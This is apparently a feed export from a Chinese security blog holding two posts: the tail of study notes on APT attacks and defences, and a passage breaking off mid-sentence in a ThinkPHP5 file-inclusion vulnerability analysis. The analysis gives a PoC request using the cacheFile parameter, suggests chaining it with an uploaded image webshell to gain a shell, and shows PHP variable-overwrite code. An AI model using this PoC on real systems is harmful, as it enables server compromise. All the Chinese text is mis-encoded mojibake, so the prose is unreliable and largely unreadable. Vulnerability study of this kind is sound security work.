title="åä¾¦å¯Ÿæœ¯"></a>åä¾¦å¯Ÿæœ¯</h3><ul><li>ä¸€äº›APTç»„ç»‡çš„æ”»å‡»æœ¨é©¬ä¼šåˆ¤æ–­è‡ªèº«æ‰€å¤„çš„ç¯å¢ƒã€å‘ç°æ€è½¯æ—¶ã€ä¼šé€‰æ‹©æ”¾å¼ƒæ‰§è¡Œåç»­çš„åŠŸèƒ½ä»£ç ã€æˆ–è€…è®¾æ³•ç»•è¿‡æ€è½¯çš„ç›‘æµ‹ã€‚</li><li>ä¸€äº›APTç»„ç»‡ä¼šå¯¹å®‰å…¨ç ”ç©¶äººå‘˜è¿›è¡Œåå‘ä¾¦å¯Ÿå·¥ä½œï¼Œæ¯”å¦‚æµ·è²èŠ±ç»„ç»‡å‘AWVSçš„ç ´è§£ç‰ˆä¸­æ’å…¥äº†æœ¨é©¬ã€‚</li></ul><h2 id="APTæ”»å‡»çš„ç›‘æµ‹ä¸é˜²å¾¡"><a href="#APTæ”»å‡»çš„ç›‘æµ‹ä¸é˜²å¾¡" class="headerlink" title="APTæ”»å‡»çš„ç›‘æµ‹ä¸é˜²å¾¡"></a>APTæ”»å‡»çš„ç›‘æµ‹ä¸é˜²å¾¡</h2><h3 id="å¦‚ä½•å‘ç°APTæ”»å‡»"><a href="#å¦‚ä½•å‘ç°APTæ”»å‡»" class="headerlink" title="å¦‚ä½•å‘ç°APTæ”»å‡»"></a>å¦‚ä½•å‘ç°APTæ”»å‡»</h3><ul><li><p>å¤§æ•°æ®æŠ€æœ¯</p><ul><li>æ•°æ®é‡‡é›†ã€æ•°æ®åˆ†æã€æ•°æ®å‘ˆç°</li></ul></li><li><p>å¨èƒæƒ…æŠ¥æŠ€æœ¯</p><ul><li><p>â€œæ ‡å¿—â€(Indicator of Compromise,IOC),ä¹Ÿå«å…¥ä¾µæŒ‡ç¤ºå™¨ï¼šé€šå¸¸åŒ…æ‹¬ä¸»æœºæ´»åŠ¨ä¸­å‡ºç°çš„æ–‡ä»¶ã€è¿›ç¨‹ã€æ³¨å†Œè¡¨é”®å€¼ã€ç³»ç»ŸæœåŠ¡ã€ç½‘ç»œä¸Šçš„åŸŸåã€URLã€IPç­‰</p></li><li><p>åˆ†ç±»</p><ul><li><p>æˆ˜æœ¯æƒ…æŠ¥</p><ul><li>æ ‡è®°æ”»å‡»è€…ä½¿ç”¨å·¥å…·ç›¸å…³çš„ç‰¹çº¸å€¼åŠç½‘ç»œåŸºç¡€è®¾æ–½ä¿¡æ¯ã€å¯ç›´æ¥ç”¨äºè®¾å¤‡ã€å®ç°å¯¹æ”»å‡»æ´»åŠ¨çš„ç›‘æ§ï¼ŒIOCå³æ˜¯ä¸€ä¸ªå…¸å‹</li></ul></li><li><p>ä½œæˆ˜æƒ…æŠ¥</p><ul><li>æè¿°æ”»å‡»è€…çš„å·¥å…·ã€æŠ€æœ¯å’Œè¿‡ç¨‹ï¼Œå³TTP</li></ul></li><li><p>æˆ˜ç•¥æƒ…æŠ¥</p><ul><li>æè¿°å½“å‰å¯¹äºç‰¹å®šç»„ç»‡çš„å¨èƒç±»å‹å’Œå¯¹æ‰‹ç°çŠ¶ã€æŒ‡å¯¼å®‰å…¨æŠ•èµ„çš„å¤§æ–¹å‘ã€‚ä½¿ç”¨è€…ä¸ºCSO(Chief Security Officer), CISO(Chief Information Security Offier)</li></ul></li></ul></li><li><p>å¨èƒæƒ…æŠ¥çš„åˆ©ç”¨</p><ul><li><p>~åœ¨å‡†å¤‡é˜¶æ®µã€æ£€æµ‹ä¸åˆ†æé˜¶æ®µã€éš”ç¦»ï¼Œæ¸…é™¤ï¼Œä¸æ¢å¤é˜¶æ®µã€äº‹åå¤ç›˜é˜¶æ®µçš„ä½œç”¨</p></li><li><p>å®‰å…¨è¿è¥å›¢é˜Ÿä¼šé‡åˆ°çš„é—®é¢˜</p><ul><li>å¦‚ä½•é«˜æ•ˆåœ°å‘ç°æ”»å‡»å’Œå…¥ä¾µæ´»åŠ¨ï¼Œè¯„ä¼°å½±å“é¢</li><li>å¦‚ä½•è·å–ã€å¤„ç½®ä¸å·²ç»å‘ç°å®‰å…¨äº‹ä»¶ç›¸å…³çš„æ´»åŠ¨</li><li>å¦‚ä½•åŸºäºå¯¹å¯¹æ‰‹çš„äº†è§£ã€è®¾ç½®å„ä¸ªç¯èŠ‚ä¸Šçš„å®‰å…¨æ§åˆ¶æªæ–½ã€ä»¥é˜»æ­¢ç›¸åŒå¯¹æ‰‹æˆ–ç±»ä¼¼æ”»å‡»æ‰‹æ³•çš„å…¥ä¾µ</li><li>ç†è§£ç›®å‰å®‰å…¨å¨èƒçš„å…¨è²Œã€å®ç°æœ‰æ•ˆçš„å®‰å…¨æŠ•èµ„</li></ul></li></ul></li></ul></li><li><p>æµé‡å¨èƒæ£€æµ‹æŠ€æœ¯</p><ul><li>æµé‡å¨èƒåˆ†æ</li><li>æµé‡æ—¥å¿—å­˜å‚¨</li><li>å¨èƒå›æº¯åˆ†æ</li></ul></li><li><p>ç½‘ç»œæ£€æµ‹å“åº”æŠ€æœ¯(Network-based Detection and Response,NDR)</p></li><li><p>ç»ˆç«¯æ£€æµ‹å“åº”æŠ€æœ¯(Endpoint Detection and Response,EDR)</p><ul><li>åŸºäºç»ˆç«¯å¤§æ•°æ®åˆ†æçš„æ–°ä¸€ä»£ç»ˆç«¯å®‰å…¨äº§å“ï¼Œèƒ½å¯¹ç»ˆç«¯è¡Œä¸ºæ•°æ®è¿›è¡Œå…¨é¢é‡‡é›†ã€å®æ—¶ä¸Šä¼ ã€å¯¹ç»ˆç«¯è¿›è¡ŒæŒç»­æ£€æµ‹å’Œåˆ†æã€å¢å¼ºå¯¹å†…éƒ¨å¨èƒäº‹ä»¶çš„æ·±åº¦å¯è§æ€§ï¼Œç»“åˆç›¸å…³å¨èƒæƒ…æŠ¥ä¸­å¿ƒæ¨é€çš„æƒ…æŠ¥ä¿¡æ¯(IPã€URLã€æ–‡ä»¶Hashç­‰)èƒ½å¸®åŠ©ä¼ä¸šå¿«é€Ÿå‘ç°ï¼Œç²¾ç¡®å®šä½é«˜çº§å¨èƒå…¥ä¾µ</li></ul></li></ul><h3 id="å¦‚ä½•åˆ†æAPTæ”»å‡»"><a href="#å¦‚ä½•åˆ†æAPTæ”»å‡»" class="headerlink" title="å¦‚ä½•åˆ†æAPTæ”»å‡»"></a>å¦‚ä½•åˆ†æAPTæ”»å‡»</h3><ul><li><p>ç½‘ç»œæ€ä¼¤é“¾æ¨¡å‹(Cyber Kill Chain)</p><ul><li><p>ä¾¦å¯Ÿ</p><ul><li>æ”»å‡»è€…é€‰æ‹©ç›®æ ‡ã€è¿›è¡Œç ”ç©¶ã€æœé›†ç›®æ ‡å¼±ç‚¹</li></ul></li><li><p>æ­¦å™¨åŒ–</p><ul><li>æ”»å‡»è€…åˆ›å»ºé’ˆå¯¹ä¸€ä¸ªæˆ–å¤šä¸ªæ¼æ´å®šåˆ¶çš„è¿œç¨‹è®¿é—®æ¶æ„ç¨‹åºæ­¦å™¨ï¼Œæ¯”å¦‚ç—…æ¯’æˆ–è •è™«</li></ul></li><li><p>æ•£å¸ƒ</p><ul><li>å°†ç½‘ç»œæ­¦å™¨åŒ…å‘ç›®æ ‡æŠ•æ”¾</li></ul></li><li><p>æ¶ç”¨</p><ul><li>åœ¨å—å®³è€…ç³»ç»Ÿä¸Šè¿è¡Œä»£ç </li></ul></li><li><p>è®¾ç½®</p><ul><li>åœ¨ç›®æ ‡ä½ç½®å®‰è£…æ¶æ„ç¨‹åº</li></ul></li><li><p>å‘½ä»¤å’Œæ§åˆ¶</p><ul><li>ä¸ºæ”»å‡»è€…å»ºç«‹å¯è¿œç¨‹æ§åˆ¶ç›®æ ‡ç³»ç»Ÿçš„è·¯å¾„</li></ul></li><li><p>ç›®æ ‡è¾¾æˆ</p><ul><li>æ”»å‡»è€…è¿œç¨‹å®Œæˆå…¶é¢„æœŸæ•ˆæœ</li></ul></li></ul></li><li><p>é’»çŸ³æ¨¡å‹</p><ul><li><p>æ”»å‡»è€…</p><ul><li>åˆ†æ¸…æ”»å‡»è€…æœ‰åˆ©ç”¨äº†è§£å…¶ç›®çš„ã€å½’å±ã€é€‚åº”æ€§å’ŒæŒä¹…æ€§</li></ul></li><li><p>èƒ½åŠ›</p><ul><li>äº‹ä»¶ä¸­ä½¿ç”¨çš„å·¥å…·æˆ–æŠ€æœ¯</li></ul></li><li><p>åŸºç¡€è®¾æ–½</p><ul><li>æ”»å‡»è€…ç”¨æ¥ä¼ é€’èƒ½åŠ›çš„ç‰©ç†æˆ–é€»è¾‘ç»“æ„ï¼Œå¦‚IPåœ°å€ã€åŸŸåã€é‚®ä»¶åœ°å€ã€USBè®¾å¤‡ç­‰</li></ul></li><li><p>å—å®³è€…</p><ul><li>ä»¥ç¤¾ä¼š-æ”¿æ²»ä¸ºæ”¯ç‚¹çš„å®‰å…¨åˆ†æä¸­ï¼Œå—å®³è€…ä½œç”¨é‡å¤§</li></ul></li></ul></li><li><p>è‡ªé€‚åº”å®‰å…¨æ¶æ„(Adaptive Security Architecture,ASA)</p><ul><li>ç”±ç¾å›½å®‰å…¨å…¬å¸Gartneräº2014å¹´æå‡ºçš„é¢å‘æœªæ¥çš„ä¸‹ä¸€ä»£å®‰å…¨æ¶æ„ï¼Œä»é¢„æµ‹ã€é˜²å¾¡ã€æ£€æµ‹ã€å“åº”å››ä¸ªç»´åº¦ï¼Œå¼ºåº¦å®‰å…¨é˜²æŠ¤æ˜¯ä¸€ä¸ªæŒç»­å¤„ç†ã€å¾ªç¯çš„è¿‡ç¨‹ï¼Œæ˜¯ç»†ç²’åº¦ã€å¤šè§’åº¦ã€æŒç»­åŒ–åœ°å¯¹å®‰å…¨å¨èƒè¿›è¡Œå®æ—¶åŠ¨æ€åˆ†æ</li><li>ç›®çš„ï¼šä¸ºäº†è§£å†³å½“å‰ä¼ä¸šçš„å®‰å…¨é˜²æŠ¤åŠŸèƒ½éš¾ä»¥åº”å¯¹é«˜çº§å®šå‘æ”»å‡»çš„é—®é¢˜</li><li>æœ€ç»ˆæ•ˆæœï¼šè¾¾åˆ°ç½‘ç»œå®‰å…¨çš„å¯ç®¡ã€å¯æ§ã€å¯è§†ã€å¯è°ƒåº¦ã€å¯æŒç»­</li></ul></li></ul><h3 id="ååŒè”åŠ¨çš„çºµæ·±é˜²å¾¡ä½“ç³»"><a href="#ååŒè”åŠ¨çš„çºµæ·±é˜²å¾¡ä½“ç³»" class="headerlink" title="ååŒè”åŠ¨çš„çºµæ·±é˜²å¾¡ä½“ç³»"></a>ååŒè”åŠ¨çš„çºµæ·±é˜²å¾¡ä½“ç³»</h3><ul><li><p>é«˜çº§å®‰å…¨å¨èƒçš„åˆ¤å®š</p><ul><li>ç»“åˆå¤šæºå¤´å¨èƒæƒ…æŠ¥åº”ç”¨ã€æ²™ç®±åŠ¨æ€è¡Œä¸ºå‘ç°ã€å…³è”å¼•æ“åˆ†æ</li></ul></li><li><p>å®‰å…¨å¨èƒçš„å¤„ç½®</p><ul><li>NDRä¸EDRè”åŠ¨</li></ul></li></ul><h2 id="APTæ”»å‡»æŠ€æœ¯-è¶‹åŠ¿"><a href="#APTæ”»å‡»æŠ€æœ¯-è¶‹åŠ¿" class="headerlink" title="APTæ”»å‡»æŠ€æœ¯(è¶‹åŠ¿)"></a>APTæ”»å‡»æŠ€æœ¯(è¶‹åŠ¿)</h2><h3 id="æŠ€æœ¯è¶Šå‘é«˜è¶…"><a href="#æŠ€æœ¯è¶Šå‘é«˜è¶…" class="headerlink" title="æŠ€æœ¯è¶Šå‘é«˜è¶…"></a>æŠ€æœ¯è¶Šå‘é«˜è¶…</h3><ul><li><p>éPEæ–‡ä»¶æ–‡ä»¶æ”»å‡»</p><ul><li>æ–‡ä»¶æ— éœ€é•¿æœŸé©»ç•™ç£ç›˜</li><li>æ ¸å¿ƒPayloadå­˜æ”¾åœ¨ç½‘ç»œæˆ–æ³¨å†Œè¡¨</li><li>é€šè¿‡ç³»ç»Ÿè¿›ç¨‹æ‰§è¡ŒPayload</li></ul></li><li><p>å¼€æºå·¥å…·å’Œè‡ªåŠ¨åŒ–æ”»å‡»æ¡†æ¶</p><ul><li><p>PowerShellè‡ªåŠ¨åŒ–æ”»å‡»æ¡†æ¶</p></li><li><p>CobaltStrike</p><ul><li>Shellcode</li><li>Beacon</li></ul></li><li><p>Koadic</p></li></ul></li><li><p>â€œLiving off the landâ€æŠ€æœ¯</p></li></ul><h3 id="å›½é™…å†²çªåœ°åŒºçš„APTæ”»å‡»æ›´åŠ æ´»è·ƒ"><a href="#å›½é™…å†²çªåœ°åŒºçš„APTæ”»å‡»æ›´åŠ æ´»è·ƒ" class="headerlink" title="å›½é™…å†²çªåœ°åŒºçš„APTæ”»å‡»æ›´åŠ æ´»è·ƒ"></a>å›½é™…å†²çªåœ°åŒºçš„APTæ”»å‡»æ›´åŠ æ´»è·ƒ</h3><ul><li>èƒ½æºèµ„æºã€å·¥ä¸šã€æŒæœ‰ä¸åŒæ”¿è§è€…</li><li>è¿™ç±»APTç»„ç»‡ï¼šé»„é‡‘é¼ ã€äººé¢ç‹®ã€APT33ã€APT34ç­‰</li></ul><h3 id="ç½‘ç»œç©ºé—´å·²æˆä¸ºå¤§å›½åšå¼ˆæ–°æˆ˜åœº"><a href="#ç½‘ç»œç©ºé—´å·²æˆä¸ºå¤§å›½åšå¼ˆæ–°æˆ˜åœº" class="headerlink" title="ç½‘ç»œç©ºé—´å·²æˆä¸ºå¤§å›½åšå¼ˆæ–°æˆ˜åœº"></a>ç½‘ç»œç©ºé—´å·²æˆä¸ºå¤§å›½åšå¼ˆæ–°æˆ˜åœº</h3><ul><li>å½±å“é¢ï¼šæ”¿æ²»ã€ç»æµã€å†›äº‹è°ˆåˆ¤ç­‰</li></ul><h3 id="é’ˆå¯¹åŸºç¡€è®¾æ–½çš„ç ´åæ€§æ”»å‡»æ—¥ç›Šæ´»è·ƒ"><a href="#é’ˆå¯¹åŸºç¡€è®¾æ–½çš„ç ´åæ€§æ”»å‡»æ—¥ç›Šæ´»è·ƒ" class="headerlink" title="é’ˆå¯¹åŸºç¡€è®¾æ–½çš„ç ´åæ€§æ”»å‡»æ—¥ç›Šæ´»è·ƒ"></a>é’ˆå¯¹åŸºç¡€è®¾æ–½çš„ç ´åæ€§æ”»å‡»æ—¥ç›Šæ´»è·ƒ</h3><ul><li>â€œäº’è”ç½‘+â€ã€5Gã€ä¸‡ç‰©äº’è”ç­‰æ–°å…´æŠ€æœ¯çš„å…´èµ·</li><li>æ¶‰åŠè¡Œä¸šï¼šèƒ½æºã€äº¤é€šã€åˆ¶é€ ã€é‡‘èã€é€šä¿¡ç­‰é¢†åŸŸ</li><li>ç°çŠ¶ï¼šå¾ˆå¤šåŸºç¡€è®¾æ–½å’Œç”Ÿäº§ç³»ç»Ÿçš„ç½‘ç»œå®‰å…¨ä½“ç³»å»ºè®¾è¿˜åŸºæœ¬ä¸ºé›¶</li></ul><h3 id="é’ˆå¯¹ä¸ªäººç§»åŠ¨ç»ˆç«¯æ”»å‡»æ˜¾è‘—å¢åŠ "><a href="#é’ˆå¯¹ä¸ªäººç§»åŠ¨ç»ˆç«¯æ”»å‡»æ˜¾è‘—å¢åŠ " class="headerlink" title="é’ˆå¯¹ä¸ªäººç§»åŠ¨ç»ˆç«¯æ”»å‡»æ˜¾è‘—å¢åŠ "></a>é’ˆå¯¹ä¸ªäººç§»åŠ¨ç»ˆç«¯æ”»å‡»æ˜¾è‘—å¢åŠ </h3><ul><li>iOSã€Android</li><li>ç³»ç»Ÿæ¼æ´ã€ç¤¾ä¼šå·¥ç¨‹å­¦</li><li>å…¸å‹ä¾‹å­ï¼šâ€œä¸‰å‰æˆŸæ¼æ´â€</li></ul><h2 id="å…¸å‹çš„APTç»„ç»‡æœºæ„"><a href="#å…¸å‹çš„APTç»„ç»‡æœºæ„" class="headerlink" title="å…¸å‹çš„APTç»„ç»‡æœºæ„"></a>å…¸å‹çš„APTç»„ç»‡æœºæ„</h2><h3 id="æ–¹ç¨‹å¼"><a href="#æ–¹ç¨‹å¼" class="headerlink" title="æ–¹ç¨‹å¼"></a>æ–¹ç¨‹å¼</h3><h3 id="ç´¢ä¼¦ä¹‹çœ¼"><a href="#ç´¢ä¼¦ä¹‹çœ¼" class="headerlink" title="ç´¢ä¼¦ä¹‹çœ¼"></a>ç´¢ä¼¦ä¹‹çœ¼</h3><h3 id="APT28"><a href="#APT28" class="headerlink" title="APT28"></a>APT28</h3><h3 id="Lazarus"><a href="#Lazarus" class="headerlink" title="Lazarus"></a>Lazarus</h3><h3 id="Group123"><a href="#Group123" class="headerlink" title="Group123"></a>Group123</h3><h2 id="å½“ç„¶è¿˜æœ‰å¾ˆå¤šç³»ç»Ÿçº§åˆ«çš„æ¼æ´ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆç»å¸¸ç”¨åˆ°çš„éƒ½æ˜¯Officeç›¸å…³çš„ï¼Œæˆ‘ä¸ªäººè®¤ä¸ºæ˜¯APTéœ€è¦å‰æœŸå¤§é‡çš„é±¼å‰æ”»å‡»æ¥è·å–çœŸå®çš„ç›®æ ‡ä¿¡æ¯ï¼Œè€ŒOfficeåœ¨å¤§éƒ¨åˆ†æ”»å‡»ç›®æ ‡çš„æœºå™¨ä¸Šåº”è¯¥éƒ½æœ‰ï¼Œä½œç”¨èŒƒå›´æ¯”è¾ƒå¤§ï¼ŒæˆåŠŸç‡é«˜çš„åŸå› å§ã€‚"><a href="#å½“ç„¶è¿˜æœ‰å¾ˆå¤šç³»ç»Ÿçº§åˆ«çš„æ¼æ´ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆç»å¸¸ç”¨åˆ°çš„éƒ½æ˜¯Officeç›¸å…³çš„ï¼Œæˆ‘ä¸ªäººè®¤ä¸ºæ˜¯APTéœ€è¦å‰æœŸå¤§é‡çš„é±¼å‰æ”»å‡»æ¥è·å–çœŸå®çš„ç›®æ ‡ä¿¡æ¯ï¼Œè€ŒOfficeåœ¨å¤§éƒ¨åˆ†æ”»å‡»ç›®æ ‡çš„æœºå™¨ä¸Šåº”è¯¥éƒ½æœ‰ï¼Œä½œç”¨èŒƒå›´æ¯”è¾ƒå¤§ï¼ŒæˆåŠŸç‡é«˜çš„åŸå› å§ã€‚" class="headerlink" title="å½“ç„¶è¿˜æœ‰å¾ˆå¤šç³»ç»Ÿçº§åˆ«çš„æ¼æ´ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆç»å¸¸ç”¨åˆ°çš„éƒ½æ˜¯Officeç›¸å…³çš„ï¼Œæˆ‘ä¸ªäººè®¤ä¸ºæ˜¯APTéœ€è¦å‰æœŸå¤§é‡çš„é±¼å‰æ”»å‡»æ¥è·å–çœŸå®çš„ç›®æ ‡ä¿¡æ¯ï¼Œè€ŒOfficeåœ¨å¤§éƒ¨åˆ†æ”»å‡»ç›®æ ‡çš„æœºå™¨ä¸Šåº”è¯¥éƒ½æœ‰ï¼Œä½œç”¨èŒƒå›´æ¯”è¾ƒå¤§ï¼ŒæˆåŠŸç‡é«˜çš„åŸå› å§ã€‚"></a>å½“ç„¶è¿˜æœ‰å¾ˆå¤šç³»ç»Ÿçº§åˆ«çš„æ¼æ´ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆç»å¸¸ç”¨åˆ°çš„éƒ½æ˜¯Officeç›¸å…³çš„ï¼Œæˆ‘ä¸ªäººè®¤ä¸ºæ˜¯APTéœ€è¦å‰æœŸå¤§é‡çš„é±¼å‰æ”»å‡»æ¥è·å–çœŸå®çš„ç›®æ ‡ä¿¡æ¯ï¼Œè€ŒOfficeåœ¨å¤§éƒ¨åˆ†æ”»å‡»ç›®æ ‡çš„æœºå™¨ä¸Šåº”è¯¥éƒ½æœ‰ï¼Œä½œç”¨èŒƒå›´æ¯”è¾ƒå¤§ï¼ŒæˆåŠŸç‡é«˜çš„åŸå› å§ã€‚</h2><p><em>XMind - Trial Version</em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200922011215.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;ã€Šé€è§†APTã€‹&quot;&gt;&lt;a href=&quot;#ã€Šé€è§†APTã€‹&quot; class=&quot;hea</summary>
      
    
    
    
    
    <category term="APT" scheme="https://hack-for.fun/tags/APT/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5æ¼æ´å­¦ä¹ -æ–‡ä»¶åŒ…å«æ¼æ´</title>
    <link href="https://hack-for.fun/8d0f.html"/>
    <id>https://hack-for.fun/8d0f.html</id>
    <published>2020-09-16T05:10:50.000Z</published>
    <updated>2020-09-16T15:59:09.731Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´"></a>ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´</h2><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index?cacheFile&#x3D;favicon.ico</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916231827.png" alt="image-20200916135216791"></p><p>å¯é…åˆæ–‡ä»¶ä¸Šä¼ å›¾ç‰‡é©¬ï¼ŒGetShellã€‚(PHP æ–‡ä»¶åŒ…å«éƒ½è®²æ–‡ä»¶å½“åšphpåç¼€æ–‡ä»¶è¿›è¡Œè§£æï¼Œä¸å®é™…æ–‡ä»¶ç±»å‹æ— å…³)</p><h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>æ¼æ´å­˜åœ¨äº <strong>ThinkPHP</strong> æ¨¡æ¿å¼•æ“ä¸­ï¼Œåœ¨åŠ è½½æ¨¡ç‰ˆè§£æå˜é‡æ—¶å­˜åœ¨<strong>å˜é‡è¦†ç›–</strong>é—®é¢˜ï¼Œè€Œä¸”ç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œæœ€ç»ˆå¯¼è‡´ <strong>æ–‡ä»¶åŒ…å«æ¼æ´</strong> çš„äº§ç”Ÿã€‚</p><ul><li>å˜é‡è¦†ç›–æ¼æ´</li></ul><p><a href="https://www.cnblogs.com/wangtanzhi/p/12748967.html">https://www.cnblogs.com/wangtanzhi/p/12748967.html</a></p><p><strong>å¦‚æœæ²¡æœ‰æŒ‡å®š flagsï¼Œåˆ™è¢«å‡å®šä¸º EXTR_OVERWRITEã€‚</strong></p><p>ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$auth = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">extract($_GET)ï¼›</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($auth==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;private!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;public!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>è¿™ç§æƒ…å†µæ²¡æœ‰æŒ‡å®š flagsï¼Œåˆ™è¢«å‡å®šä¸º EXTR_OVERWRITE</strong></p><p>å‡è®¾ç”¨æˆ·æ„é€ ä»¥ä¸‹é“¾æ¥ï¼š<a href="http://www.a.com/test1.php?auth=1">http://www.a.com/test1.php?auth=1</a><br>ç•Œé¢ä¸Šä¼šæ‰“å°å‡ºprivateï¼</p><p>å®‰å…¨çš„åšæ³•æ˜¯ç¡®å®šregister_globals=OFFåï¼Œåœ¨è°ƒç”¨extract()æ—¶ä½¿ç”¨EXTR_SKIPä¿è¯å·²æœ‰å˜é‡ä¸ä¼šè¢«è¦†ç›–ã€‚<br>ps:<br>PHP extract() å‡½æ•°ä»æ•°ç»„ä¸­æŠŠå˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ä¸­ã€‚å¯¹äºæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œé”®åç”¨äºå˜é‡åï¼Œé”®å€¼ç”¨äºå˜é‡å€¼ã€‚</p><h2 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.18</strong> ã€<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.10</strong> </p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>è¿™é‡Œä»¥<code>ThinkPHP 5.0.18</code>  è¿›è¡Œåˆ†æã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916184327.png" alt="image-20200916153529187"></p><p>åœ¨å†å²<code>Releases</code> ä¿¡æ¯ä¸­ï¼Œæ‰¾åˆ°äº† <code>5.0.19</code> ä¸­ï¼Œæ”¹è¿›äº† æ¨¡æ¿å¼•æ“çš„ä¸€å¤„å¯èƒ½çš„å®‰å…¨éšæ‚£ã€‚</p><p><code>/library/think/template/driver/File.php</code> ä¸­çš„ <code>File</code> ç±»ä¸­çš„<code>read</code> æ–¹æ³•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185031.png" alt="image-20200916161144712"></p><ul><li>ç”¨æˆ·Getæäº¤çš„æ•°æ®éƒ½ä¼šé€šè¿‡<code>input</code> æ–¹æ³•è·å–æ•°æ®ï¼Œç„¶åé€šè¿‡<code>filterValue</code> æ–¹æ³•è¿›è¡Œè¿‡æ»¤å’Œå¼ºåˆ¶ç±»å‹è½¬æ¢ã€‚</li><li>åœ¨ä¿®æ”¹åçš„ä»£ç ä¸‹æ–­ç‚¹ï¼Œç„¶åçœ‹æ–¹æ³•è°ƒç”¨å’Œå‚æ•°ä¼ é€’ã€‚å¦‚ä¸‹å›¾ï¼š</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185043.png" alt="image-20200916163325855"></p><p>åœ¨<code>../application/index/index/controller/index.php</code> ä¸­ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;assign(request()-&gt;get());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(); <span class="comment">// å½“å‰æ¨¡å—/é»˜è®¤è§†å›¾ç›®å½•/å½“å‰æ§åˆ¶å™¨ï¼ˆå°å†™ï¼‰/å½“å‰æ“ä½œï¼ˆå°å†™ï¼‰.html</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¢«<code>get</code>æ–¹æ³•è·å–ï¼Œç„¶åè°ƒç”¨äº†<code>input</code>æ–¹æ³•å’Œé€’å½’è°ƒç”¨<code>filterValue</code> æ–¹æ³•ï¼Œå¹¶ä¸”è¯¥æ–¹æ³•è¿˜ä¼šç»§ç»­è°ƒç”¨<code>filterExp</code> æ–¹æ³•å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè¿‡æ»¤ï¼Œç„¶åè¿”å›ç»™<code>$data</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185108.png" alt="image-20200916165017001"></p><p>ç„¶åå†è°ƒç”¨<code>assign</code> æ–¹æ³•ï¼Œè¿”å›å¤„ç†åçš„æ•°æ®ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185121.png" alt="image-20200916171205436"></p><p>å› 